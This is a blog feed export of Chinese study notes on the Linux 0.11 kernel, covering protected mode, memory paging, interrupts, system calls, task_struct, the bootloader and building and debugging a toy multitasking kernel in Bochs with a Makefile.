<li>16M的空间仅仅需要4个页表(16M/1024/4K=4)，一个页4*1024字节,一个页目录项包括1024个页表，一个页表含有1024个页，因此仅仅需要一个页目录表和4个页表即可。(默认情况Linux 0.11最多可以管理16MB的物理内存)</li>
<li>小于16M的物理内存也可以运行Linux 0.11,在init/main.c中也仅仅映射了0-16MB的内存范围，多了也用不到，除非自己修改内核代码，增加页表。</li>
</ul>
<h2 id="任务0"><a href="#任务0" class="headerlink" title="任务0"></a>任务0</h2><ul>
<li>空闲进程，主要执行pause()系统调用<br><img src="/images/Linux_0.11_chapter5_task0_space.png" alt="Linux_0.11_chapter5_task0_space.png"><h2 id="任务1"><a href="#任务1" class="headerlink" title="任务1"></a>任务1</h2></li>
<li>init进程<br><img src="/images/Linux_0.11_chapter5_task1_space_part1.png" alt="Linux_0.11_chapter5_task1_space_part1.png"><br><img src="/images/Linux_0.11_chapter5_task1_space_part2.png" alt="Linux_0.11_chapter5_task1_space_part2.png"><h2 id="其他任务"><a href="#其他任务" class="headerlink" title="其他任务"></a>其他任务</h2><img src="/images/Linux_0.11_chapter5_other_task_space.png" alt="Linux_0.11_chapter5_other_task_space.png"><br><img src="/images/Linux_0.11_chapter5_other_task_space_part2.png" alt="Linux_0.11_chapter5_other_task_space_part2.png"><h2 id="用户主动申请的内存"><a href="#用户主动申请的内存" class="headerlink" title="用户主动申请的内存"></a>用户主动申请的内存</h2></li>
<li>由task_struct结构体(PCB)维护的brk值满足C库中malloc函数的动态堆内存分布需求。</li>
<li>内核仅仅更新brk值并延迟等到访问页失败的时候才分配真正的空间</li>
<li>free释放的时候也仅仅是告知内核将对应的页标记为空闲，以被程序再次使用，当进程结束的时候才回收。</li>
</ul>
<h1 id="中断机制"><a href="#中断机制" class="headerlink" title="中断机制"></a>中断机制</h1><ul>
<li>采用外置8259A芯片来管理多级优先级中断。<br><img src="/images/Linux_0.11_chapter5_int_8259.png" alt="Linux_0.11_chapter5_int_8259.png"><br><img src="/images/Linux_0.11_chapter5_int_IRP.png" alt="Linux_0.11_chapter5_int_IRP.png"></li>
<li>中断请求号对应实际的信号引脚，中断号将由PIC通过数据总线送往CPU。</li>
<li>中断门和陷阱门的区别在于对EFLAGS中的IF的影响，进入到中断门后CPU会自动复位IF以防止其他中断干扰，随后的iret也会自动从堆栈中恢复，而陷阱门则不会影响IF。<br><img src="/images/Linux_0.11_chapter5_int_number_part1.png" alt="Linux_0.11_chapter5_int_number_part1.png"><br><img src="/images/Linux_0.11_chapter5_int_number_part2.png" alt="Linux_0.11_chapter5_int_number_part2.png"></li>
</ul>
<h1 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h1><ul>
<li>syscalls是Linux内核与上层应用程序进行交互通信的唯一接口，约定调用软中断号为0x80(int 0x80)。参数传递为eax表示调用功能号，ebx、ecx、edx为参数，详情参考源码。</li>
<li>0.11版本的多用C嵌入汇编实现</li>
<li>0.11版本的内核约定进程在内核态运行不会被调度程序切换即进程在内核态运行时是不可抢占的。后期内核版本由于性能需求必须被设计成可抢占的。</li>
</ul>
<h1 id="Linux进程控制"><a href="#Linux进程控制" class="headerlink" title="Linux进程控制"></a>Linux进程控制</h1><ul>
<li>任务主要数据结构<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">i387_struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">long</span>	cwd;</span><br><span class="line">	<span class="keyword">long</span>	swd;</span><br><span class="line">	<span class="keyword">long</span>	twd;</span><br><span class="line">	<span class="keyword">long</span>	fip;</span><br><span class="line">	<span class="keyword">long</span>	fcs;</span><br><span class="line">	<span class="keyword">long</span>	foo;</span><br><span class="line">	<span class="keyword">long</span>	fos;</span><br><span class="line">	<span class="keyword">long</span>	st_space[<span class="number">20</span>];	<span class="comment">/* 8*10 bytes for each FP-reg = 80 bytes */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tss_struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">long</span>	back_link;	<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	esp0;</span><br><span class="line">	<span class="keyword">long</span>	ss0;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	esp1;</span><br><span class="line">	<span class="keyword">long</span>	ss1;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	esp2;</span><br><span class="line">	<span class="keyword">long</span>	ss2;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	cr3;</span><br><span class="line">	<span class="keyword">long</span>	eip;</span><br><span class="line">	<span class="keyword">long</span>	eflags;</span><br><span class="line">	<span class="keyword">long</span>	eax,ecx,edx,ebx;</span><br><span class="line">	<span class="keyword">long</span>	esp;</span><br><span class="line">	<span class="keyword">long</span>	ebp;</span><br><span class="line">	<span class="keyword">long</span>	esi;</span><br><span class="line">	<span class="keyword">long</span>	edi;</span><br><span class="line">	<span class="keyword">long</span>	es;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	cs;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	ss;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	ds;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	fs;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	gs;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	ldt;		<span class="comment">/* 16 high bits zero */</span></span><br><span class="line">	<span class="keyword">long</span>	trace_bitmap;	<span class="comment">/* bits: trace 0, bitmap 16-31 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">i387_struct</span> <span class="title">i387</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"><span class="comment">/* these are hardcoded - don&#x27;t touch */</span></span><br><span class="line">	<span class="keyword">long</span> state;	<span class="comment">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span></span><br><span class="line">	<span class="keyword">long</span> counter; <span class="comment">//任务运行时间计数(递减)(滴答数),运行时间片</span></span><br><span class="line">	<span class="keyword">long</span> priority;<span class="comment">//优先级,初始化的时候等于上者</span></span><br><span class="line">	<span class="keyword">long</span> signal; <span class="comment">//信号,位图,每个比特代表一种信号</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sigaction</span>[32];</span> <span class="comment">//信号执行属性结构，对应信号将要执行的操作和标志信息</span></span><br><span class="line">	<span class="keyword">long</span> blocked;	<span class="comment">/* bitmap of masked signals */</span> </span><br><span class="line"><span class="comment">/* various fields */</span></span><br><span class="line">	<span class="keyword">int</span> exit_code;<span class="comment">//父进程会采集</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> start_code,end_code,end_data,brk,start_stack;<span class="comment">//代码段地址，长度等信息</span></span><br><span class="line">	<span class="keyword">long</span> pid,father,pgrp,session,leader;进程标识号,父进程号,进程组号,会话号，会话首领</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> uid,euid,suid;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> gid,egid,sgid;</span><br><span class="line">	<span class="keyword">long</span> alarm;<span class="comment">//报警定时值</span></span><br><span class="line">	<span class="keyword">long</span> utime,stime,cutime,cstime,start_time;<span class="comment">//各个状态运行时间</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> used_math;<span class="comment">//是否采用协处理器</span></span><br><span class="line"><span class="comment">/* file system info */</span></span><br><span class="line">	<span class="keyword">int</span> tty;		<span class="comment">/* -1 if no tty, so it must be signed */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">short</span> umask;<span class="comment">//文件创建属性屏蔽位</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">pwd</span>;</span><span class="comment">//当前目录i节点结构指针</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">root</span>;</span><span class="comment">//根目录i节点结构指针</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">m_inode</span> * <span class="title">executable</span>;</span><span class="comment">//执行文件i节点结构指针</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> close_on_exec;<span class="comment">//执行时关闭文件句柄位图标志</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> * <span class="title">filp</span>[<span class="title">NR_OPEN</span>];</span><span class="comment">//文件结构指针表</span></span><br><span class="line"><span class="comment">/* ldt for this task 0 - zero 1 - cs 2 - ds&amp;ss */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> <span class="title">ldt</span>[3];</span></span><br><span class="line"><span class="comment">/* tss for this task */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tss_struct</span> <span class="title">tss</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="创建新进程"><a href="#创建新进程" class="headerlink" title="创建新进程"></a>创建新进程</h2><img src="/images/Linux_0.11_chapter5_fork_principle.png" alt="Linux_0.11_chapter5_fork_principle.png"><h2 id="调度程序"><a href="#调度程序" class="headerlink" title="调度程序"></a>调度程序</h2><img src="/images/Linux_0.11_chapter5_schedule_algorithm.png" alt="Linux_0.11_chapter5_schedule_algorithm.png"><h2 id="堆栈分布"><a href="#堆栈分布" class="headerlink" title="堆栈分布"></a>堆栈分布</h2><img src="/images/Linux_0.11_chapter5_stack_space.png" alt="Linux_0.11_chapter5_stack_space.png"></li>
</ul>
<h1 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h1><p><img src="/images/Linux_0.11_chapter5_file_system_minix.png" alt="Linux_0.11_chapter5_file_system_minix.png"></p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>Linux 0.11内核基本框架摘录，详情还得根据需求继续参考，争取尽快熟悉根文件系统并拓展shell。</p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>Linux kernel</tag>
        <tag>LDD</tag>
        <tag>Asm</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核0.11完全注释 第六章</title>
    <url>/embpgp.github.io/2016/12/14/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-%E7%AC%AC%E5%85%AD%E7%AB%A0/</url>
    <content><![CDATA[<blockquote>
<p>迷你bootloader部分</p>
</blockquote>
<span id="more"></span>


<hr>
<h1 id="从ROM-BIOS处接手过来"><a href="#从ROM-BIOS处接手过来" class="headerlink" title="从ROM BIOS处接手过来"></a>从ROM BIOS处接手过来</h1><p><img src="/images/Linux_0.11_chapter6_bootloader_seq.png" alt="Linux_0.11_chapter6_bootloader_seq.png"><br><img src="/images/Linux_0.11_chapter6_bootloader_graph.png" alt="Linux_0.11_chapter6_bootloader_graph.png"></p>
<h1 id="加载内核代码"><a href="#加载内核代码" class="headerlink" title="加载内核代码"></a>加载内核代码</h1><ul>
<li>需要参考ROM BIOS的中断使用手册，从硬盘加载数据以及控制显示设备等</li>
<li>MBR的508、509偏移字节处保存根设备号</li>
<li>参考书籍作者的<a href="http://www.oldlinux.org/Linux.old/docs/">资料</a>中《Linux内核源代码漫游》  </li>
</ul>
<h1 id="硬盘设备号"><a href="#硬盘设备号" class="headerlink" title="硬盘设备号"></a>硬盘设备号</h1><p><img src="/images/Linux_0.11_chapter6_disk_device_number.png" alt="Linux_0.11_chapter6_disk_device_number.png"></p>
<h1 id="全局参数"><a href="#全局参数" class="headerlink" title="全局参数"></a>全局参数</h1><p><img src="/images/Linux_0.11_chapter6_setup_global_params.png" alt="Linux_0.11_chapter6_setup_global_params.png"></p>
<h1 id="PIC-8295A中断芯片"><a href="#PIC-8295A中断芯片" class="headerlink" title="PIC 8295A中断芯片"></a>PIC 8295A中断芯片</h1><ul>
<li>配置相当复杂，建议直接用现成的吧。</li>
</ul>
<h1 id="system模块映像"><a href="#system模块映像" class="headerlink" title="system模块映像"></a>system模块映像</h1><p><img src="/images/Linux_0.11_chapter6_system_map.png" alt="Linux_0.11_chapter6_system_map.png"></p>
<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本章跟以前分析的小程序大同小异，只不过开启了分页机制，但是也是很简单的换算。</p>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>Linux kernel</tag>
        <tag>LDD</tag>
        <tag>Asm</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核0.11完全注释 第四章-番外篇</title>
    <url>/embpgp.github.io/2016/11/22/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E7%95%AA%E5%A4%96%E7%AF%87/</url>
    <content><![CDATA[<blockquote>
<p>本篇将根据实战经验来构建这个简单的多任务内核的运行</p>
</blockquote>
<span id="more"></span>

<hr>
<h1 id="Bochs安装和配置"><a href="#Bochs安装和配置" class="headerlink" title="Bochs安装和配置"></a>Bochs安装和配置</h1><ul>
<li>通过Debian或者RHEL的包管理器直接安装或者源码安装都可以，网上多建议源码安装，说可以开启调试和反汇编功能，我发现都差不多，至于Win平台的直接点击点击即可。</li>
<li>按照网上的一些教程将拷贝一份配置文件或者直接文本新建一个，将<strong>romimage</strong>和<strong>vgaromimage</strong>的路径配置好，我的配置如下，删除了很多没啥用的。看启动文件可知道仅仅需要一个设备即可完成。<strong>Image</strong>是后面编译链接后用dd命令写入的文件。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">romimage: file=<span class="variable">$BXSHARE</span>/BIOS-bochs-latest</span><br><span class="line">megs: 16</span><br><span class="line">vgaromimage: file=/usr/<span class="built_in">local</span>/share/bochs/VGABIOS-lgpl-latest</span><br><span class="line">floppya: 1_44=Image, status=inserted</span><br><span class="line">boot: a</span><br><span class="line"><span class="built_in">log</span>: bochsout.txt</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="生成启动文件"><a href="#生成启动文件" class="headerlink" title="生成启动文件"></a>生成启动文件</h1><ul>
<li>首先由于我没有Get到原网站的资料，只好硬着头皮根据书本的后面章节来推敲了。<br>　<img src="/images/Linux_0.11_chapter4_make_by_heself.png" alt="Linux_0.11_chapter4_make_by_heself.png"></li>
<li>我根据上图自己”凑合着”编写Makefile文件。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rutk1t0r@Rutk1t0r:example_for_multi_tasks$ cat Makefile </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Image: boot system</span><br><span class="line">	dd bs=32 <span class="keyword">if</span>=boot of=Image skip=1</span><br><span class="line">	dd bs=1 <span class="keyword">if</span>=system of=Image skip=4096 seek=512   <span class="comment">#必须指出这里的错误，skip偏移量是0x1000，不是1024</span></span><br><span class="line"></span><br><span class="line">boot: boot.o</span><br><span class="line">	ld86 -0 -s -o <span class="variable">$@</span> $&lt;</span><br><span class="line">boot.o: boot.s</span><br><span class="line">	as86 -0 -a -o <span class="variable">$@</span> $&lt;</span><br><span class="line"></span><br><span class="line">system: head.o</span><br><span class="line">	ld -m elf_i386 -Ttext 0 -e startup_32 -s -x -M $&lt; -o <span class="variable">$@</span> &gt; System.map</span><br><span class="line">head.o: head.s</span><br><span class="line">	as -32 -o <span class="variable">$@</span> $&lt;</span><br><span class="line"></span><br><span class="line">disk:</span><br><span class="line">	dd bs=8192 <span class="keyword">if</span>=Image of=/dev/fd0</span><br><span class="line">	sync;sync;sync</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">	-rm -rf *.o boot system System.map Image</span><br><span class="line">rutk1t0r@Rutk1t0r:example_for_multi_tasks$</span><br><span class="line">rutk1t0r@Rutk1t0r:example_for_multi_tasks$ make clean</span><br><span class="line">rm -rf *.o boot system System.map Image</span><br><span class="line">rutk1t0r@Rutk1t0r:example_for_multi_tasks$ make</span><br><span class="line">as86 -0 -a -o boot.o boot.s</span><br><span class="line">ld86 -0 -s -o boot boot.o</span><br><span class="line">as -32 -o head.o head.s</span><br><span class="line">ld -m elf_i386 -Ttext 0 -e startup_32 -s -x -M head.o -o system &gt; System.map</span><br><span class="line">dd bs=32 <span class="keyword">if</span>=boot of=Image skip=1</span><br><span class="line">记录了16+0 的读入</span><br><span class="line">记录了16+0 的写出</span><br><span class="line">512 bytes copied, 0.00025786 s, 2.0 MB/s</span><br><span class="line">dd bs=1 <span class="keyword">if</span>=system of=Image skip=4096 seek=512   <span class="comment">#必须指出这里的错误，skip偏移量是0x1000，不是1024</span></span><br><span class="line">记录了4996+0 的读入</span><br><span class="line">记录了4996+0 的写出</span><br><span class="line">4996 bytes (5.0 kB, 4.9 KiB) copied, 0.0211415 s, 236 kB/s</span><br><span class="line">rutk1t0r@Rutk1t0r:example_for_multi_tasks$</span><br></pre></td></tr></table></figure></li>
<li>由于我们这个<strong>多任务内核例子</strong>并不需要文件系统，仅仅只是模拟一下保护模式下的各种机制，因此bochs的配置文件可以直接设置为软盘启动并直接配置<strong>Image</strong>为启动文件。这里需要说明的是如果直接照着Makefile文件的来dd，参数skip是有问题的，我当时为了编译能够通过从网上找了很多参数，可能原文编译的情况不同吧。由于elf文件格式的缘故必须去掉它的头部,用工具查看得知代码段偏移量在0x1000，所以我为了简单好看就每次单字节的写入了4096次。不想自个儿敲以及稍微详细点的注释请参考<a href="https://github.com/embpgp/Linux_kernel_0.11_examples/tree/master/chapter4/example_for_multi_tasks">这里</a>。</li>
</ul>
<h1 id="奔跑吧，小内核"><a href="#奔跑吧，小内核" class="headerlink" title="奔跑吧，小内核~~~"></a>奔跑吧，小内核~~~</h1><ul>
<li><p>首先键入类似<code>bochs -f ./$config_file</code>，如果没问题则键入6或者直接回车。<br><img src="/images/Linux_0.11_chapter4_extra_bochs_start.png" alt="Linux_0.11_chapter4_extra_bochs_start.png"></p>
</li>
<li><p>遇到如下情况就表示进入了调试状态了，左边的小黑框暂时停在了ROM BIOS处等待我们输入命令，可以先输入<code>b 0x7c00</code>，让其断在我们可控的第一条指令处。具体的调试指令可参考<a href="http://www.cnblogs.com/hongzg1982/articles/2111254.html">这里</a><br><img src="/images/Linux_0.11_chapter4_extra_bochs_6.png" alt="Linux_0.11_chapter4_extra_bochs_6.png"></p>
</li>
<li><p>断在了物理地址0x7c00处，此时为boot.s文件代码中第一条指令，正在搭建进入保护模式的环境。后面可以根据汇编代码单步走(s)来一一对照执行。<br><img src="/images/Linux_0.11_chapter4_extra_bochs_0x7c00.png" alt="Linux_0.11_chapter4_extra_bochs_0x7c00.png"></p>
</li>
<li><p>接下来看点有趣的东西，由于我多次调试已经知道了内核各个数据结构在内存中的地址(对照调试界面和源码界面，内核数据结构符号均已经变成内存地址)。我便直接下断点在<code>timer_interrupt</code>这个时钟中断处理函数的某一条语句(cmpl)来观察现象。断点地址0x0表示刚刚进入保护模式的内核代码段首地址处。<br><img src="/images/Linux_0.11_chapter4_extra_bochs_protect_0.png" alt="Linux_0.11_chapter4_extra_bochs_protect_0.png"></p>
</li>
<li><p>注意观察bochs界面的左上角处，已经打印出了大约10个A。<br><img src="/images/Linux_0.11_chapter4_extra_bochs_first_show.png" alt="Linux_0.11_chapter4_extra_bochs_first_show.png"></p>
</li>
<li><p>用s单步走，注意观察第一次jmp后的变化,esp已经改变,此时已经处于任务1即打印B的任务的用户空间了。由于处于调试状态的程序不能单步直接响应定时器中断，我们再次键入c继续等待下一次中断。<br><img src="/images/Linux_0.11_chapter4_extra_bochs_first_jmp.png" alt="Linux_0.11_chapter4_extra_bochs_first_jmp.png"></p>
</li>
<li><p>注意观察bochs界面的左上角处，又打印了大约10B。说明此时被中断后来到了任务1(即打印B)的内核空间，esp也发生了变化。<br><img src="/images/Linux_0.11_chapter4_extra_bochs_task0_kernel.png" alt="Linux_0.11_chapter4_extra_bochs_task0_kernel.png"></p>
</li>
<li><p>此时的jmp之后esp发生了变化，从tss0中恢复task0的现场，即处于上次被jmp后的地方，因此它必须得继续执行后面的指令，虽然仍然处于中断处理过程，但是CPU不管那么多，它只知道取指译码执行，不出权限问题就没啥事。等到iret指令执行后便会回到task0的用户空间继续打印A了。<br><img src="/images/Linux_0.11_chapter4_extra_bochs_task0_kernel_resume.png" alt="Linux_0.11_chapter4_extra_bochs_task0_kernel_resume.png"></p>
</li>
<li><p>看到了没?这就是我所说的”三个esp”,此图说明当时被时钟中断的时候task0正在”睡眠”，B也类似的。<br><img src="/images/Linux_0.11_chapter4_extra_bochs_task0_kernel_resume_user.png" alt="Linux_0.11_chapter4_extra_bochs_task0_kernel_resume_user.png"></p>
</li>
<li><p>去掉中断看全景图吧!!!瞬间被霸屏。<br><img src="/images/Linux_0.11_chapter4_extra_bochs_running.png" alt="Linux_0.11_chapter4_extra_bochs_running.png"></p>
</li>
<li><p>自己新增加的任务2,其中利用了局部段描述符的第0个槽位,打印字符’0’。<br><img src="/images/Linux_0.11_chapter4_extra_bochs_add_2_task.png" alt="Linux_0.11_chapter4_extra_bochs_add_2_task.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>能折腾总会学到很多…关于代码的分析请参见<a href="https://github.com/embpgp/Linux_kernel_0.11_examples/tree/master/chapter4/example_for_multi_tasks">这里</a>吧</p>
</li>
</ul>
]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>C/C++</tag>
        <tag>Linux kernel</tag>
        <tag>LDD</tag>
        <tag>Asm</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux内核0.11完全注释 第四章</title>
    <url>/embpgp.github.io/2016/11/19/Linux%E5%86%85%E6%A0%B80-11%E5%AE%8C%E5%85%A8%E6%B3%A8%E9%87%8A-%E7%AC%AC%E5%9B%9B%E7%AB%A0/</url>
    <content><![CDATA[<blockquote>
<p>介绍Intel 80X86保护模式及其编程</p>
</blockquote>
<span id="more"></span>

<hr>
<h1 id="80X86基础知识"><a href="#80X86基础知识" class="headerlink" title="80X86基础知识"></a>80X86基础知识</h1><h2 id="eflags标志寄存器"><a href="#eflags标志寄存器" class="headerlink" title="eflags标志寄存器"></a>eflags标志寄存器</h2><ul>
<li>几个系统标志的作用，其中需要说明的IF标志位也是可以控制的，通过汇编指令<code>sti</code>和<code>cli</code>。需要特权才能执行，否则产生异常。Intel芯片的设计者增加这几个标志位的目的是为了配合操作系统更好地管理系统资源以及安全性的提升，诚然操作系统设计者可以不用理会部分标志，但是有这些硬件机制使得程序流程执行起来更加快速。<br><img src="/images/Linux_0.11_chapter4_eflag_sys.png" alt="Linux_0.11_chapter4_eflag_sys.png">  </li>
</ul>
<h2 id="内存管理寄存器"><a href="#内存管理寄存器" class="headerlink" title="内存管理寄存器"></a>内存管理寄存器</h2><blockquote>
<p>由于80386及以后的CPU的主要工作状态均采用保护模式(相对于8086时代的实模式)，其实所谓的保护最主要的还是保护内存，DOS时代的病毒太过于泛滥的主要原因之一是当时8086的内存保护几乎为0。因此真正懂得程序布局和设计的早期hacker可以随意”摆弄”计算机。而保护模式便要大大提高门槛了，把恶意指令限制在CPU内部解决而不直接通过系统总线送往内存控制器。  </p>
</blockquote>
<h3 id="GDTR"><a href="#GDTR" class="headerlink" title="GDTR"></a>GDTR</h3><ul>
<li>全局描述符表寄存器，CPU内部，48位，保存GDT的32位线性基地址和16位表长度(字节)</li>
<li>使用汇编指令LGDT和SGDT来加载和保存GDTR的内容</li>
<li>刚刚上电初始化base为0,len为0xFFFF</li>
<li>boot阶段进入保护模式过程中必须被赋值,因为一旦进入保护模式便要一直用它</li>
</ul>
<h3 id="IDTR"><a href="#IDTR" class="headerlink" title="IDTR"></a>IDTR</h3><ul>
<li>中断描述符寄存器,CPU内部，48位，保存IDT的32位线性地址和16位表长度(字节为单位)</li>
<li>LIDT和SIDT</li>
<li>上电同上</li>
<li>也是必须被设置，但是初始化过程中可以关闭中断使得如同空设。而后必须填充好。</li>
</ul>
<h3 id="LDTR"><a href="#LDTR" class="headerlink" title="LDTR"></a>LDTR</h3><ul>
<li>不仅包含和GDTR的48位,还有段属性以及选择子</li>
<li>可用于任务切换的局部空间寻址</li>
</ul>
<h3 id="TR"><a href="#TR" class="headerlink" title="TR"></a>TR</h3><ul>
<li>同上，但描述符部分属性和内容更多</li>
</ul>
<h2 id="控制寄存器"><a href="#控制寄存器" class="headerlink" title="控制寄存器"></a>控制寄存器</h2><h3 id="CRO"><a href="#CRO" class="headerlink" title="CRO"></a>CRO</h3><ul>
<li>主要含有控制处理器模式和状态的系统控指标志</li>
<li>协处理器的相关控制(浮点计算)</li>
<li>保护模式开启和关闭以及分页模式的启毕 </li>
</ul>
<h3 id="CR1-Intel保留"><a href="#CR1-Intel保留" class="headerlink" title="CR1 Intel保留"></a>CR1 Intel保留</h3><h3 id="CR2"><a href="#CR2" class="headerlink" title="CR2"></a>CR2</h3><ul>
<li>异常的线性地址保存CR2，便于实现虚拟内存</li>
</ul>
<h3 id="CR3"><a href="#CR3" class="headerlink" title="CR3"></a>CR3</h3><ul>
<li>PDBR，高20位为页目录基地址，低12位暂时保留。</li>
<li>任务切换时被更新，分页机制的第一基点</li>
</ul>
<h1 id="保护模式内存管理"><a href="#保护模式内存管理" class="headerlink" title="保护模式内存管理"></a>保护模式内存管理</h1><h2 id="地址变换"><a href="#地址变换" class="headerlink" title="地址变换"></a>地址变换</h2><p><img src="/images/Linux_0.11_chapter4_address_convert.png" alt="Linux_0.11_chapter4_address_convert.png"></p>
<h2 id="段的定义"><a href="#段的定义" class="headerlink" title="段的定义"></a>段的定义</h2><blockquote>
<p>Intel芯片中的分段机制必须开启，但是软件开发人员可以采用平坦模式，即配置分段机制的各个选择子描述符基址为0，长度为4G，好处是便于后期编程。</p>
</blockquote>
<h3 id="段描述符"><a href="#段描述符" class="headerlink" title="段描述符"></a>段描述符</h3><ul>
<li>GDT </li>
<li>8字节,含段基址，段限长及段属性，可表示(类似继承)成各种段，包括代码段，数据段，tss段等等</li>
<li>由GDTR指向，一般确定后不会更改地址，可以增加项目<br>　- 第一项约定必须为空</li>
<li>LDT</li>
<li>属性差不多同上，但只能包含成任务的代码段和数据段等，不包含特殊系统段。</li>
<li>第一项可以用</li>
</ul>
<h3 id="段选择符"><a href="#段选择符" class="headerlink" title="段选择符"></a>段选择符</h3><p><img src="/images/Linux_0.11_chapter4_sector.png" alt="Linux_0.11_chapter4_sector.png"></p>
<ul>
<li><p>以前的段寄存器并不直接用于寻址，而是提供index，并隐含不可直接操作的Cache部分，只有在切换的时候才更新，加快处理速度。<br><img src="/images/Linux_0.11_chapter4_sector_CDEFGS.png" alt="Linux_0.11_chapter4_sector_CDEFGS.png"></p>
</li>
<li><p>各个8字节的描述符概括图，主要三个字段的段基址、段限长和段属性一般由编译器、链接器、加载器和操作系统来创建。详细定义参考Intel开发者手册等。开发者需要理解芯片设计者的本意而后根据自己的实际情况来创建。<br><img src="/images/Linux_0.11_chapter4_SD_common.png" alt="Linux_0.11_chapter4_SD_common.png"></p>
</li>
<li><p>除了代码段、数据段和堆栈段等一般的段还有系统描述符类型，包括LDT、TSS、调用门、中断门、陷阱门和任务门。</p>
</li>
</ul>
<h3 id="分页机制"><a href="#分页机制" class="headerlink" title="分页机制"></a>分页机制</h3><ul>
<li>作为分段机制的补充和”串联选择”,如果不开启则分段过程后地址将直接放在系统总线上。</li>
<li>提供OS高级功能虚拟内存的硬件平台。</li>
<li>提供加强的内存属性保护<br><img src="/images/Linux_0.11_chapter4_address_to_real_address.png" alt="Linux_0.11_chapter4_address_to_real_address.png"><h1 id="各种保护措施"><a href="#各种保护措施" class="headerlink" title="各种保护措施"></a>各种保护措施</h1><img src="/images/Linux_0.11_chapter4_protect_for_segment_and_page.png" alt="Linux_0.11_chapter4_protect_for_segment_and_page.png"><h2 id="段级保护"><a href="#段级保护" class="headerlink" title="段级保护"></a>段级保护</h2><blockquote>
<p>所有违反保护的操作都将导致产生一个异常，要么进行异常过程处理，要么down掉Reset。</p>
</blockquote>
</li>
</ul>
<h3 id="段界限检查"><a href="#段界限检查" class="headerlink" title="段界限检查"></a>段界限检查</h3><ul>
<li>主要是GDT、LDT、IDT长度限制和常规描述符的段限长控制<h3 id="段类型检查"><a href="#段类型检查" class="headerlink" title="段类型检查"></a>段类型检查</h3><blockquote>
<p>谈谈绕过方法的个人猜想，当不讨论分页机制时候或者说没有开启分页的时候，分段机制作为最核心的内存保护而存在于CPU内部。诸如下面的保护都是在CPU内部完成的，当我们想要修改内存中数据怎么办呢？首先需要取得所有权限，即0特权级，而后建立新的描述符指向我们想要修改的内存区域(例如某某进程的密码等等),而后即可绕过”他人的防守”径直地向系统总线上发控制信号来读写内存数据。而当其他进程再去操作的时候拿到的东西已经被”掉过包”了。这也是为什么内存攻防中能够提权的漏洞越来越得到重视的原因之一，由于shellcode等已经被”共享”得差不多了，也大同小异。为了获取系统权限，必须不断Fuzzing冲击内存，突破程序逻辑….</p>
</blockquote>
</li>
</ul>
<ul>
<li>根据描述符属性字段中的tpye进行匹配</li>
<li>当一个描述符的选择符被加进段寄存器时</li>
<li>CS寄存器只能被加载进一个可执行段的选择符;</li>
<li>不可读可执行的选择符不能加进数据段选择子;</li>
<li>只有可写数据段才能被加进SS寄存器  </li>
